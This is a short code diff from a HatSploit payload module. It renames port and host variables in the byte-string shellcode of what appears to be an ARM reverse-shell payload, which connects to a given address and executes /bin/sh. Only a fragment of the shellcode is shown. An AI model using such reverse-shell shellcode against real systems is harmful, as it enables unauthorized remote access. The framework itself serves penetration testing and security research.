@@ -102,10 +102,10 @@ class HatSploitModule:
             b"\x92\x1a\x05\xb4" +
             b"\x69\x46\x0b\x27" +
             b"\x01\xDF\xC0\x46" +
-            b"\x02\x00" + remote_port +  # "\x12\x34" struct sockaddr and port
-            remote_host +                # reverse ip address
-            b"\x2f\x62\x69\x6e" +        # /bin
-            b"\x2f\x73\x68\x00"          # /sh\0
+            b"\x02\x00" + local_port +  # "\x12\x34" struct sockaddr and port
+            local_host +                # reverse ip address
+            b"\x2f\x62\x69\x6e" +       # /bin
+            b"\x2f\x73\x68\x00"         # /sh\0
         )
         
         self.badges.output_process("Generating payload...")
